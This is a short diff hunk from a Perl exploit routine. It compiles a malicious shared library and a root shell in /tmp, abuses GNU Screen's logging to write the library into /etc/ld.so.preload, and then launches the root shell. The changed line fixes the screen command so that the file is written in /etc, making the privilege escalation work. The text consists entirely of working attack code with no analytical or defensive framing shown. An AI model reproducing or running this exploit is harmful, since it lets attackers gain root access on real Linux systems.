@@ -45,7 +45,7 @@ sub exploit {
 system("gcc -fPIC -shared -ldl /tmp/libhax.c -o /tmp/libhax.so");
 system("gcc -o /tmp/rootshell /tmp/rootshell.c");
 system("cd /etc && umask 000 ");
-system('screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so');
+system("cd /etc && screen -D -m -L ld.so.preload echo -ne  '\x0a/tmp/libhax.so'");
 system("screen -ls");
 system('/tmp/rootshell');
 };
